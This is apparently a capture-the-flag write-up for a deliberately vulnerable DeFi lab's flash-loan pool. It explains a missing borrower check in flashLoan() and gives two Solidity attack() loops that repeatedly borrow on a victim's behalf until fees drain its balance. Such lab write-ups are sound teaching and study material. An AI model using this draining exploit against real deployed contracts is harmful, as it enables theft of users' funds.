## Problem 
```flashLoan()``` function from ```NaiveReceiverLenderPool``` not check that the borrower is function caller (```msg.sender```) or not. it's allow anyone to operate the ```flashLoan()``` to any borrower as long as the borrower is a contract: 
```js
    require(borrower.isContract(), "Borrower must be a deployed contract");
```
and the borrower have a function called "receiveEther(uint256)" (if not it will call fallback() function). 

## Solution 

to make this exploit done within one transaction we can make contract to operate ```flashLoan``` and make receiver loan for several times until his balance drawn up. this is the example of function to attack: 
```js
    function attack() external {
        while (address(target).balance > 0) {
            pool.flashLoan(target, 1);
        }
    }
``` 
remember that solidity need Interface to communicate within contract like that. for alternative we can use call function instead:
```js
    function attack() external {
        while (address(target).balance > 0) {
            (bool success,) = pool.call(abi.encodeWithSignature("flashLoan(address,uint256)",target, 1 ));
            require(success);
        }
    }
```